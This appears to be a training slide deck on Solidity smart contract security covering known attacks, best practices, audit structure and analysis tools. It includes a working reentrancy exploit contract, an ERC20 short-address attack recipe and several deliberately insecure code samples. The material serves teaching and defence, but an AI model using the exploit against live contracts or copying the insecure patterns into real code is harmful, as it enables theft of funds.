# Security in Solidity Smart Contracts

## Security Recommendations, Known Attacks, Security Tools

# Table of Contents
- Smart Contract Security
- Best Practices
- Security Tools
- Known Attacks
![](/assets/smart-contract-security-table-of-contents-01.png)
![](/assets/smart-contract-security-table-of-contents-02.png)
![](/assets/smart-contract-security-table-of-contents-03.png)


# Smart Contract Security
- Security Recommendations, Known Attacks, Security Tools
![](/assets/smart-contract-security-smart-contract-security-01.png)


# Smart Contract Security
- Two main sources of security problems:
  - Bugs in the **Ethereum infrastructure**: protocols, EVM, geth / Parity
  - Bugs / design issues in the **smart contract code**– developer mistakes
- Ethereum's virtual machine (EVM) has been improved over the time, **Solidity** has matured, many mistakes were corrected
![](/assets/smart-contract-security-smart-contract-security-01.png)


<!-- # Smart Contract Security -->
- Smart contract programming requires
  - **Different engineering mindset**
- The cost of **failure** can be **high**
- Changes can be **difficult**
  - Similar to **hardware development**
- So be careful
  - Educate the developers
  - Perform code audits
  - Formal verification?
![](/assets/smart-contract-security-smart-contract-security-2-01.png)
![](/assets/smart-contract-security-smart-contract-security-2-02.png)


# Smart Contracts: Well Known Attacks 
- **Reentrancy** attack
- Cross-function race conditions
- Integer **overflow**
- **Replay** attack
- **Short address**attack
- Denial of Service (**DoS**) attack
  - with (unexpected) revert
  - with block gas limit
- Forcibly sending ether to a contract
- **TX reordering** attack
- Timestamp dependence attack
![](/assets/smart-contract-security-smart-contracts-well-known-attacks-01.png)


# Smart Contracts: Best Practices
- **Prepare** for failure
- Keep contracts **simple**
- Stay **up to date**
- Be aware of **blockchain properties**
- Fundamental engineering tradeoffs:
  - **Simplicity** versus **Complexity**
  - **Rigid** versus **Upgradeable**
  - **Monolithic** versus **Modular**
  - **Duplication** versus **Reuse**
![](/assets/smart-contract-security-smart-contracts-best-practices-01.png)
![](/assets/smart-contract-security-smart-contracts-best-practices-02.png)


# Smart Contract Security Tools
- Static analysis
  - Manticore
    - github.com/trailofbits/manticore 
  - Mythril
    - github.com/ConsenSys/mythril 
  - Oyente
    - oyente.melon.fund
- SolGraph
  - github.com/raineorshine/solgraph 
- Linters
  - Solcheck 	
  - Solint 
  - Solium 
  - Solhint


# Smart Contracts Security Notifications
- The official Ethereum blog: Ethereum Blog
- Consensys Best Practices
- Chat rooms: 
  - Ethereum Gitter
  - Solidity
  - Go-Ethereum
  - CPP-Ethereum
  - Research
- Reddit
- Ethereum Stats: Network Stats
![](/assets/smart-contract-security-smart-contracts-security-notifications-01.png)


# Structure of Smart Contract Audit
- **Disclaimer**
- **Overview** of the audit and nice features
- **Attacks** made to the contract
- **Critical** vulnerabilities found in the contract
- Medium **vulnerabilities** found in the contract
- Low **severity** vulnerabilities found
- Line by line **comments**
- **Summary** of the audit
![](/assets/smart-contract-security-structure-of-smart-contract-audit-01.png)


<!-- # [Demo -->
- Formal Verification of Smart Contracts
![](/assets/smart-contract-security-demo-01.png)


<!-- # [Demo -->
- Smart Contract Audits
![](/assets/smart-contract-security-demo-01.png)


# Reentrancy Attack
- Used **.call()** which actually makes a call on the EVM
  - If the **address** specified is a **contract**, and has a **fallback** function, the **EVM** runs whatever is in it
  - The fallback function calls the **withdraw()** again &rarr; if state not updated before call, we have reentrancy bug
- Solution:
  - Replace **msg.sender.call.value(etherAmount)()** with **msg.sender.send(etherAmount)** or **msg.sender.transfer(etherAmount)**


# Reentrancy Attack Example – Contract

```cs
contract HoneyPot {
  mapping (address => uint) public balances;
  function deposit() public payable {
    balances[msg.sender] += msg.value;
  }
  function withdraw() public {
    require(balances[msg.sender] > 0);
    if (!msg.sender.call.value(balances[msg.sender])())
      revert();
    balances[msg.sender] = 0;
  }
}
```



# Reentrancy Attack Example – Exploit Code

```cs
contract HoneyPotHacker {
  HoneyPot private honeypot;
  function HoneyPotHacker(address a) public payable {
    honeypot = HoneyPot(a);
  }
  function collectMoney() public payable {
    honeypot.deposit.value(msg.value)();
    honeypot.withdraw();
    selfdestruct(msg.sender);
  }
  function() external payable {
    if (honeypot.balance >= msg.value) {
      honeypot.withdraw();
    }
  }
}
```

![](/assets/smart-contract-security-reentrancy-attack-example-exploit-code-01.png)


# **Cross-function Race Conditions**

```cs
// INSECURE
mapping (address => uint) private userBalances;

function transfer(address to, uint amount) {
    if (userBalances[msg.sender] >= amount) {
       userBalances[to] += amount;
       userBalances[msg.sender] -= amount;
    }
}

function withdrawBalance() public {
    uint amountToWithdraw = userBalances[msg.sender];
    require(msg.sender.call.value(amountToWithdraw)()); 
    userBalances[msg.sender] = 0;
}
```

<div class="fragment balloon" style="top:29.96%; left:98.71%; width:23.80%">Can execute **transfer()**</div>


# ERC20 Short Attack
- Invoke the **transfer**(address a, uint v) method 
- Transfer 1 GNT to address **0xabcabcabcabcabcabcabcabcabcabcabcabcabca**needs to include 3 pieces of data:
  - Method id - **4 bytes**: a9059cbb
  - Destination address (20 bytes) with leading zeros - **32 bytes**: 000000000000000000000000abcabcabcabcabcabcabcabcabcabcabcabcabca
  - Value to transfer (1 * 10¹⁸ GNT) - **32 bytes**: 0000000000000000000000000000000000000000000000000de0b6b3a7640000
- Full transaction : **a9059cbb**000000000000000000000000abcabcabcabcabcabcabcabcabcabcabcabcabca**0000000000000000000000000000000000000000000000000de0b6b3a7640000**


<!-- # ERC20 Short Attack -->
- Construct Attack
- Have 1,000 tokens 
- Would like 256,000
- Generate an **Ethereum address**with a trailing 0 (256 tries)
- Find an **exchange wallet**with 256,000 tokens
- **Send** 1,000 tokens to this wallet
- **Request** a **withdrawal** of 1,000 tokens
- Fixes
- Check **address validity** in-band
- Including **throwing** for data **underflows**
- Check user input for full **20 bytes** address
- Transfer function could check that **len( msg.data )** is 68 bytes
- **OnlyPayloadSize** modifier


# **Integer Overflow**

```cs
// INSECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance */
    require(balanceOf[msg.sender] >= _value);
    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}
```


```cs
// SECURE
function transfer(address _to, uint256 _value) {
    /* Check if sender has balance and for overflows */
    require(balanceOf[msg.sender] >= _value && 
	  balanceOf[_to] + _value >= balanceOf[_to]);

    /* Add and subtract new balances */
    balanceOf[msg.sender] -= _value;
    balanceOf[_to] += _value;
}
```



# **DoS Attacks**

```cs
// INSECURE
contract Auction {
    address currentLeader;
    uint highestBid;

    function bid() payable {
        require(msg.value > highestBid);
        require(currentLeader.send(highestBid));
        currentLeader = msg.sender;
        highestBid = msg.value;
    }
}
```

<div class="fragment balloon" style="top:20.58%; left:92.54%; width:26.45%">Can be manipulated</div>


# **Forcibly Sending Ether to a Contract**

```cs
contract Vulnerable {
    function () payable {
        revert();
    }

    function somethingBad() {
        require(this.balance > 0);
        // Do something bad
    }
}
```

- Contract logic seems to **disallow** payments
- **selfdestruct** does not trigger a contract's **fallback** function
- Possible to precompute a contract's address


# **Miner’s Manipulations**
- **Transaction-Ordering** Dependence
  - **Order of transactions**(within a block) is easily subject
    - to manipulation
  - Transaction in the **mempool** for short while
    - It is know what **actions** will **occur** before it is included in the block
  - You need to be very **careful** in your **contract logic**
- **Timestamp** Dependence
  - Don’t use **Timestamp** for important logic and things like **Random()**


# Exercise: Reentrancy Attack on a Smart Contract
- Deploy Smart Contract and Hack It
![](/assets/smart-contract-security-exercise-reentrancy-attack-on-a-smart-contract-01.png)


# Summary
- Smart Contract Security
- Best Practices
- Security Tools
- Known Attacks
![](/assets/smart-contract-security-summary-01.png)
